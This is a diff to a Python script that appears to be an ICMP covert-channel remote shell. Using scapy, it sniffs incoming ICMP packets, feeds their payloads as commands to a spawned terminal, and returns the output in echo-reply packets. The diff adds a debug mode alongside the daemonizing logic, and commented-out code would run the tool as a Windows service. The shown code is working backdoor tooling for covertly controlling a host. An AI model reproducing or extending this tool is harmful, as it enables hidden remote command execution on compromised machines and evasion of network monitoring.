@@ -31,7 +31,7 @@ def readstderr():
         if string == '':
             continue
         reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=0,
-                                                     id=config.ID) / string
+                                                                                  id=config.ID) / string
         sendp(reply_packet, verbose=False)
         sys.stderr.write(string + "\n")
 
@@ -50,6 +50,17 @@ def packet_callback(packet):
         print("-----+ OUT DATA +-----")
         sendcommand(received_data)
 
+
+def sniff_in_debug():
+    t1 = threading.Thread(target=readstdout)
+    t2 = threading.Thread(target=readstderr)
+
+    t1.start()
+    t2.start()
+
+    sniff(filter="icmp", prn=packet_callback)
+
+
 with Daemonizer() as (is_setup, daemonizer):
     if is_setup:
         ish_debug = 1
@@ -66,11 +77,15 @@ with Daemonizer() as (is_setup, daemonizer):
         if args.d:
             ish_debug = 0
 
-    is_parent, destination_ip, destination_mac = daemonizer(
-        'icmp-shell.pid',
-        "",
-        "ff:ff:ff:ff:ff:ff"
-    )
+        if ish_debug:
+            sniff_in_debug()
+
+    if ish_debug == 0:
+        is_parent, destination_ip, destination_mac = daemonizer(
+            'icmp-shell.pid',
+            "",
+            "ff:ff:ff:ff:ff:ff"
+        )
 
 p = subprocess.Popen(
     opening_terminal.terminal_name,
@@ -82,10 +97,12 @@ p = subprocess.Popen(
 
 t1 = threading.Thread(target=readstdout)
 t2 = threading.Thread(target=readstderr)
-t1.start()
-t2.start()
-sniff(filter="icmp", prn=packet_callback)
 
+if ish_debug == 0:
+    t1.start()
+    t2.start()
+
+    sniff(filter="icmp", prn=packet_callback)
 
 # sniff(filter="icmp", prn=packet_callback)
 
@@ -159,9 +176,9 @@ sniff(filter="icmp", prn=packet_callback)
 #        t2.start()
 #        sniff(filter="icmp", prn=packet_callback)
 
-    # if len(sys.argv) == 1:
-    #    servicemanager.Initialize()
-    #    servicemanager.PrepareToHostSingle(Service)
-    #    servicemanager.StartServiceCtrlDispatcher()
-    # else:
-    #    win32serviceutil.HandleCommandLine(Service)
+# if len(sys.argv) == 1:
+#    servicemanager.Initialize()
+#    servicemanager.PrepareToHostSingle(Service)
+#    servicemanager.StartServiceCtrlDispatcher()
+# else:
+#    win32serviceutil.HandleCommandLine(Service)
